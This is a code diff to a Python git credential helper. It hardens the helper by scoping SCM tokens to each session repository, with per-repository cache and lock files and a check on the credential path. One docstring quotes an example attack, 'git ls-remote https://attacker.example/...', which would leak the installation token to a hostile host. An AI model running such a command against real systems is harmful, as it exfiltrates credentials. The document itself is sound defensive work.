@@ -12,11 +12,10 @@ Protocol summary (action = "get"):
     Input on stdin:  key=value lines terminated by an empty line
     Output on stdout: request context lines plus username=… and password=…
 
-Caching: a successful response is persisted to `/run/oi/scm-creds.json` (mode
-0600). Subsequent invocations return the cached credentials until they're
-within `CACHE_REFRESH_BUFFER_SECONDS` of expiry. Concurrent invocations are
-serialised with an advisory lock on a sibling file so two git commands racing
-on first boot don't both call out to the control plane.
+Caching: each normalized session repository gets its own mode-0600 cache and
+advisory lock under `/run/oi`. Subsequent invocations return that repository's
+cached credentials until they're within `CACHE_REFRESH_BUFFER_SECONDS` of
+expiry. Repositories never share a token or a refresh lock.
 
 The cache is never used as a fallback for a failed refresh: if the control
 plane rejects us, we exit non-zero. Stale tokens silently authenticating are
@@ -27,6 +26,7 @@ from __future__ import annotations
 
 import contextlib
 import fcntl
+import hashlib
 import json
 import os
 import sys
@@ -40,13 +40,23 @@ if TYPE_CHECKING:
     from collections.abc import Mapping
 
 CACHE_DIR = Path(os.environ.get("OI_SCM_CRED_CACHE_DIR", "/run/oi"))
-CACHE_FILE = CACHE_DIR / "scm-creds.json"
-LOCK_FILE = CACHE_DIR / "scm-creds.lock"
 CACHE_REFRESH_BUFFER_SECONDS = 5 * 60
 REQUEST_TIMEOUT_SECONDS = 15
 # Image-build sandboxes have no control plane to refresh against. They live
 # for minutes, so we treat the injected token as good for one hour.
 BUILD_MODE_TOKEN_TTL_SECONDS = 60 * 60
+
+type Repository = tuple[str, str]
+
+
+def _repository_cache_paths(repository: Repository) -> tuple[Path, Path]:
+    """Return cache and lock paths unique to one normalized repository."""
+    owner, name = repository
+    digest = hashlib.sha256(f"{owner}/{name}".encode()).hexdigest()
+    return (
+        CACHE_DIR / f"scm-creds-{digest}.json",
+        CACHE_DIR / f"scm-creds-{digest}.lock",
+    )
 
 
 def _log(message: str) -> None:
@@ -120,41 +130,113 @@ def _credentials_from_env() -> dict[str, object] | None:
     }
 
 
-def _is_authorized_request(input_lines: dict[str, str]) -> tuple[bool, str]:
+def _repository_pair(value: object) -> Repository | None:
+    if not isinstance(value, dict):
+        return None
+    owner = value.get("repo_owner") or value.get("repoOwner")
+    name = value.get("repo_name") or value.get("repoName")
+    if not isinstance(owner, str) or not isinstance(name, str):
+        return None
+    owner = owner.strip()
+    name = name.strip()
+    if not owner or not name:
+        return None
+    return owner.lower(), name.lower()
+
+
+def _allowed_repositories() -> dict[Repository, Repository]:
+    """Map normalized repository identities to their canonical wire values."""
+    raw_session_config = os.environ.get("SESSION_CONFIG", "")
+    config: dict[str, object] = {}
+    if raw_session_config:
+        try:
+            loaded = json.loads(raw_session_config)
+        except json.JSONDecodeError:
+            loaded = None
+        if isinstance(loaded, dict):
+            config = cast("dict[str, object]", loaded)
+
+    configured = config.get("repositories")
+    values = configured if isinstance(configured, list) and configured else [config]
+    repositories: dict[Repository, Repository] = {}
+    for value in values:
+        pair = _repository_pair(value)
+        if pair is not None:
+            repositories[pair] = pair
+
+    if repositories or (isinstance(configured, list) and configured):
+        return repositories
+
+    fallback = _repository_pair(
+        {
+            "repo_owner": os.environ.get("REPO_OWNER"),
+            "repo_name": os.environ.get("REPO_NAME"),
+        }
+    )
+    return {fallback: fallback} if fallback is not None else {}
+
+
+def _repository_from_credential_path(path: str) -> Repository | None:
+    parts = path.strip().strip("/").split("/")
+    if len(parts) < 2:
+        return None
+    owner = parts[0].strip().lower()
+    name = parts[1].strip()
+    if name.lower().endswith(".git"):
+        name = name[:-4]
+    suffix = [part.lower() for part in parts[2:] if part]
+    if suffix not in ([], ["info", "lfs"]):
+        return None
+    if not owner or not name:
+        return None
+    return owner, name.lower()
+
+
+def _is_authorized_request(input_lines: dict[str, str]) -> tuple[Repository | None, str]:
     """Decide whether to serve credentials for this credential request.
 
     The system-wide helper would otherwise hand the SCM token to any host
     git resolves — a malicious submodule URL or `git ls-remote
     https://attacker.example/...` could exfiltrate the installation token. We
-    scope by protocol and host. We deliberately do not scope to the session repo:
-    the existing system uses installation-wide credentials, and setup/start hooks
-    may clone sibling private repositories that the installation can access.
+    scope by protocol, host, and the exact session repository named by the
+    credential path.
 
     * protocol must be ``https`` (never hand a token to a plaintext remote);
     * host must equal the configured ``VCS_HOST``.
 
-    Returns ``(authorized, reason)`` so the caller can log the rejection.
+    Returns the normalized session repository and a reason so the caller can
+    log rejections without ever requesting a token for them.
     """
     protocol = input_lines.get("protocol", "").strip().lower()
     if protocol != "https":
-        return False, f"protocol={protocol!r} is not https"
+        return None, f"protocol={protocol!r} is not https"
 
     requested_host = input_lines.get("host", "").strip().lower()
     if not requested_host:
-        return False, "no host provided"
+        return None, "no host provided"
     expected_host = os.environ.get("VCS_HOST", "github.com").strip().lower()
     if requested_host != expected_host:
-        return False, f"host={requested_host!r} (expected {expected_host!r})"
+        return None, f"host={requested_host!r} (expected {expected_host!r})"
 
-    return True, ""
+    path = input_lines.get("path", "").strip()
+    if not path:
+        return None, "no repository path provided; credential.useHttpPath=true is required"
+    requested = _repository_from_credential_path(path)
+    if requested is None:
+        return None, f"path={path!r} is not an exact repository credential path"
+    allowed = _allowed_repositories().get(requested)
+    if allowed is None:
+        return None, f"repository={requested[0]}/{requested[1]} is not part of this session"
+    return allowed, ""
 
 
-def _read_cached() -> dict[str, object] | None:
+def _read_cached(repository: Repository) -> dict[str, object] | None:
     """Return the cached credentials if present and still within their TTL."""
-    if not CACHE_FILE.exists():
+    cache_file, _lock_file = _repository_cache_paths(repository)
+    if not cache_file.exists():
         return None
     try:
-        with CACHE_FILE.open("r", encoding="utf-8") as fp:
+        with cache_file.open("r", encoding="utf-8") as fp:
             raw_cached = json.load(fp)
     except (OSError, json.JSONDecodeError):
         return None
@@ -176,25 +258,32 @@ def _read_cached() -> dict[str, object] | None:
     return cached
 
 
-def _atomic_write_cache(payload: dict[str, object]) -> None:
+def _atomic_write_cache(repository: Repository, payload: dict[str, object]) -> None:
     """Persist credentials to disk with restrictive permissions."""
     CACHE_DIR.mkdir(parents=True, exist_ok=True)
-    tmp_path = CACHE_DIR / ".scm-creds.json.tmp"
+    cache_file, _lock_file = _repository_cache_paths(repository)
+    tmp_path = cache_file.with_suffix(".tmp")
     fd = os.open(str(tmp_path), os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
     try:
         os.write(fd, json.dumps(payload).encode("utf-8"))
     finally:
         os.close(fd)
-    tmp_path.replace(CACHE_FILE)
+    tmp_path.replace(cache_file)
 
 
-def _fetch_from_control_plane(endpoint: tuple[str, str, str]) -> dict[str, object]:
+def _fetch_from_control_plane(
+    endpoint: tuple[str, str, str], repository: Repository
+) -> dict[str, object]:
     """Mint a fresh credential set from the control plane."""
     control_plane_url, auth_token, session_id = endpoint
     url = f"{control_plane_url}/sessions/{session_id}/scm-credentials"
 
     with httpx.Client(timeout=REQUEST_TIMEOUT_SECONDS) as client:
-        response = client.post(url, headers={"Authorization": f"Bearer {auth_token}"})
+        response = client.post(
+            url,
+            headers={"Authorization": f"Bearer {auth_token}"},
+            json={"repoOwner": repository[0], "repoName": repository[1]},
+        )
 
     if response.status_code != 200:
         body = response.text[:200]
@@ -211,7 +300,7 @@ def _fetch_from_control_plane(endpoint: tuple[str, str, str]) -> dict[str, objec
     return data
 
 
-def _get_credentials() -> dict[str, object]:
+def _get_credentials(repository: Repository) -> dict[str, object]:
     """Return cached credentials if fresh, otherwise refresh under a lock.
 
     Prefers control-plane brokerage. Falls back to the static
@@ -234,22 +323,23 @@ def _get_credentials() -> dict[str, object]:
             )
         return env_creds
 
-    cached = _read_cached()
+    cached = _read_cached(repository)
     if cached is not None:
         return cached
 
     CACHE_DIR.mkdir(parents=True, exist_ok=True)
-    with open(LOCK_FILE, "w", encoding="utf-8") as lock_fp:
+    _cache_file, lock_file = _repository_cache_paths(repository)
+    with lock_file.open("w", encoding="utf-8") as lock_fp:
         fcntl.flock(lock_fp.fileno(), fcntl.LOCK_EX)
         try:
             # Re-check after acquiring the lock: a concurrent helper may have
             # refreshed already.
-            cached = _read_cached()
+            cached = _read_cached(repository)
             if cached is not None:
                 return cached
 
-            fresh = _fetch_from_control_plane(endpoint)
-            _atomic_write_cache(fresh)
+            fresh = _fetch_from_control_plane(endpoint, repository)
+            _atomic_write_cache(repository, fresh)
             return fresh
         finally:
             fcntl.flock(lock_fp.fileno(), fcntl.LOCK_UN)
@@ -302,8 +392,12 @@ def _print_gh_token() -> int:
     """
     if not _gh_wrapper_should_mint(os.environ):
         return 0
+    repositories = list(_allowed_repositories().values())
+    if len(repositories) != 1:
+        _log("cannot mint gh token without exactly one session repository")
+        return 0
     try:
-        credentials = _get_credentials()
+        credentials = _get_credentials(repositories[0])
     except Exception as e:
         _log(f"failed to obtain gh token: {e}")
         return 0
@@ -335,13 +429,13 @@ def main(argv: list[str] | None = None) -> int:
     # response as "I have nothing", so returning 0 with no output lets it fall
     # through to any other helper or fail the auth cleanly — without us ever
     # emitting the token to the wrong host.
-    authorized, reason = _is_authorized_request(input_lines)
-    if not authorized:
+    repository, reason = _is_authorized_request(input_lines)
+    if repository is None:
         _log(f"refusing to serve credentials: {reason}")
         return 0
 
     try:
-        credentials = _get_credentials()
+        credentials = _get_credentials(repository)
     except Exception as e:
         _log(f"failed to obtain credentials: {e}")
         return 1
